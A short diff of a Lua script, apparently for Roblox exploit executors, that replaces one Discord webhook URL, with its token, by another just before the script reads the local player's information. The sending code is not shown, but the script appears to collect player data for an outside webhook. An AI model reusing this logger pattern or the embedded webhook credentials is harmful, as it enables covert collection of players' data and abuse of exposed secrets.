@@ -2,7 +2,7 @@
 local exploit = syn and "Synapse X" or KRNL_LOADED and "Krnl" or "Unknown Exploit"
 
 -- Discord webhook URL
-local webhookUrl = "https://discord.com/api/webhooks/1132117375215476827/RLyaUit671i3NCj-mDbeBkwg2FxciPpWLuG74f7Qiu9spzhev287fRgEfN2YoJTT3D6I"
+local webhookUrl = "https://discord.com/api/webhooks/1196995652115239033/B5TIKDqjePUPil0V6B6qUrY9VkG_-AMbJ0DW_56eP3jOxx8ay3v2FGsfSqN5r5kuvT8v"
 
 -- Get the player's information
 local player = game.Players.LocalPlayer
